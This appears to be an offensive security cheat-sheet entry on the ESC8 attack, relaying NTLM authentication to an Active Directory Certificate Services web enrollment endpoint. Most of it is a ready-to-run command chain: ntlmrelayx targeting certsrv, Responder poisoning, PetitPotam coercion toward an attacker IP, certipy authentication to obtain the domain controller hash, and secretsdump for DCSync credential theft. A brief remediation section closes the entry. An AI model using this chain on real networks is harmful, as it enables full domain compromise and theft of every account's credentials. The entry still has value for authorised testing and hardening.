# ESC8 - NTLM Relay to AD CS HTTP Endpoint

## Why It's Vulnerable

The CA's web enrollment interface (`http://<CA>/certsrv/`) accepts NTLM authentication over HTTP. If you can relay NTLM authentication to this endpoint (using ntlmrelayx), you can request a certificate as the relayed user - including Domain Controllers, which gives you DCSync rights.

## The Attack

```sh
# Terminal 1 - relay to the CA web enrollment
ntlmrelayx.py -t http://<CA-IP>/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController

# Terminal 2 - Responder or mitm6 to capture auth
sudo responder -I eth0 -dPv

# Or coerce a DC to auth to you (PetitPotam)
python3 PetitPotam.py -u user -p pass <attacker-IP> <DC-IP>

# When a DC authenticates -> ntlmrelayx prints a base64 cert
certipy auth -pfx dc01.pfx -dc-ip <DC-IP>
# -> DC machine account hash -> DCSync
```

Full DCSync once you have the DC machine hash:
```sh
secretsdump.py -hashes :<DC01$-NT-hash> 'corp.local/DC01$@dc01.corp.local'
```

### Windows alternative

There is no Certify command for ESC8 - the whole attack is a relay, not a request. From a Windows foothold use **Inveigh** to poison/capture, but you still need `ntlmrelayx` (Linux/WSL) or `Impacket-for-Windows` builds to actually relay the auth to `certsrv`. Once you have the PFX, `Rubeus.exe asktgt` handles the PKINIT side.

---

## Remediation

Disable **NTLM authentication** on the CA web enrollment endpoint (IIS -> Authentication -> disable Windows Authentication, enable only certificate-based). Or enforce HTTPS + Extended Protection for Authentication (EPA). Microsoft's KB5005413 details the hardening steps.
